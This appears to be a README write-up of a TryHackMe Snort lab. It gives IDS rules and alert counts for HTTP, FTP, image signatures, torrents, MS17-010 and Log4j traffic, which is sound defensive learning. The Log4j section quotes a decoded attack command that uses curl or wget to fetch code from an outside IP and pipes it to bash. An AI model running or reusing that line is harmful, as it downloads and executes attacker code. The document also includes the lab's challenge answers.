# Snort Challenge – The Basics

Hands-on IDS rule writing and packet analysis completed while working through TryHackMe's **Snort Challenge – The Basics** room.

> This repository is for defensive-security learning in an authorized lab environment. PCAP files from the training platform are not redistributed here.

## What I practiced

- Writing Snort IDS rules for HTTP and FTP traffic
- Matching file signatures for PNG and GIF files
- Detecting torrent metafiles in packet payloads
- Troubleshooting Snort rule syntax and logic errors
- Using external rules to investigate MS17-010 activity
- Detecting Log4j exploitation indicators
- Inspecting Snort alert/log output and packet metadata
- Using `content`, hexadecimal payload matching, `dsize`, SIDs, and bidirectional rules

## Environment

Typical command structure used throughout the lab:

```bash
sudo snort -c local.rules -r capture.pcap -A console
```

For full alert output and local logging:

```bash
sudo snort -c local.rules -A full -l . -r capture.pcap
```

## 1. HTTP traffic

```snort
alert tcp any any <> any 80 (msg:"HTTP Port 80 Traffic"; sid:1000001; rev:1;)
```

Observed alert count: **164**.

Packet-analysis findings:
- Packet 63 destination IP: `216.239.59.99`
- Packet 64 ACK: `0x2E6B5384`
- Packet 62 SEQ: `0x36C21E28`
- Packet 65 TTL: `128`
- Packet 65 source IP: `145.254.160.237`
- Packet 65 source port: `3372`

## 2. FTP traffic

```snort
alert tcp any any <> any 21 (msg:"FTP Port 21 Traffic"; sid:1000001; rev:1;)
```

Observed alert count: **614**. FTP service: **Microsoft FTP Service**.

Failed login:
```snort
alert tcp any any <> any 21 (msg:"Failed FTP Login"; content:"530 User"; sid:1000002; rev:1;)
```
Alert count: **41**.

Successful login:
```snort
alert tcp any any <> any 21 (msg:"Successful FTP Login"; content:"230 User"; sid:1000003; rev:1;)
```
Alert count: **1**.

Valid username, password required:
```snort
alert tcp any any <> any 21 (msg:"FTP Valid Username Password Required"; content:"331 Password"; sid:1000004; rev:1;)
```
Alert count: **42**.

Administrator username, password required:
```snort
alert tcp any any <> any 21 (msg:"FTP Administrator Password Required"; content:"331 Password"; content:"Administrator"; sid:1000005; rev:1;)
```
Alert count: **7**.

## 3. PNG and GIF detection

PNG magic bytes:
```text
89 50 4E 47 0D 0A 1A 0A
```

```snort
alert tcp any any <> any any (msg:"PNG File Detected"; content:"|89 50 4E 47 0D 0A 1A 0A|"; sid:1000010; rev:1;)
```
Embedded software: **Adobe ImageReady**.

GIF:
```snort
alert tcp any any <> any any (msg:"GIF File Detected"; content:"|47 49 46 38|"; sid:1000011; rev:1;)
```
Image format: **GIF89a**.

## 4. Torrent metafile detection

```snort
alert tcp any any <> any any (msg:"Torrent Metafile Detected"; content:".torrent"; nocase; sid:1000020; rev:1;)
```

Observed alert count: **2**.

Findings:
- Application: `bittorrent`
- MIME type: `application/x-bittorrent`
- Hostname: `tracker2.torrentbox.com`

## 5. Troubleshooting Snort rules

Results after fixing each rule file:

| Rule file | Result |
|---|---:|
| `local-1.rules` | 16 |
| `local-2.rules` | 68 |
| `local-3.rules` | 87 |
| `local-4.rules` | 90 |
| `local-5.rules` | 155 |
| `local-6.rules` | 2 |
| `local-7.rules` | `msg` |

Example case-sensitivity fix:
```snort
alert tcp any any <> any 80 (msg:"GET Request Found"; content:"|47 45 54|"; sid:1000030; rev:1;)
```

## 6. MS17-010 investigation

Supplied external rules produced **25,154 alerts**.

IPC share detection:
```snort
alert tcp any any <> any any (msg:"IPC Share Detected"; content:"|5C 49 50 43 24|"; sid:1000040; rev:1;)
```

Observed alert count: **12**.

Requested path:
```text
\\192.168.116.138\IPC$
```

CVSS v2 score: **9.3**.

## 7. Log4j investigation

Supplied rules produced **26 alerts** and **4 unique triggered rules**.

First six SID digits:
```text
210037
```

Payload-size rule:
```snort
alert tcp any any <> any any (msg:"Payload between 770 and 855 bytes"; dsize:770<>855; sid:1000050; rev:1;)
```

Observed alert count: **41**.

Findings:
- Encoding algorithm: **Base64**
- IP ID: **62808**

Decoded command observed in the malicious payload:
```text
(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash
```

Documented for analysis only; do not execute it.

CVSS v2 score: **9.3**.

## Skills demonstrated

`Snort` · `IDS` · `Network Security` · `Packet Analysis` · `PCAP Analysis` · `Detection Engineering` · `HTTP` · `FTP` · `SMB` · `Log4j` · `MS17-010`
